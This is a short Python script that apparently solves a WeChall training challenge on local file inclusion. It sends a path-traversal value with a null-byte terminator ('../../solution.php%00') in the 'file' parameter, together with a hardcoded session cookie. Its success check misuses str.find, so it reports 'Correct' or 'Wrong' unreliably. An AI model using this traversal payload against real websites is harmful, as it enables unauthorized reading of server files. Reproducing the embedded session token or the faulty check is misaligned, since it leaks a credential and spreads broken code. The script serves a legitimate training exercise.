import requests

sol_url = "https://www.wechall.net/challenge/training/php/lfi/up/index.php?file="
WC = "17997040-12786-mEnfghCU61nlTFm5"
ans_file = '../../solution.php%00'

cookie = {'WC':WC}

sol_url = sol_url + ans_file

resp = requests.get(sol_url, cookies=cookie)

if resp.text.find('Your answer is correct'):
    print('Correct! Problem solved.')
else:
    print('Beep! Wrong answer! Try Again!')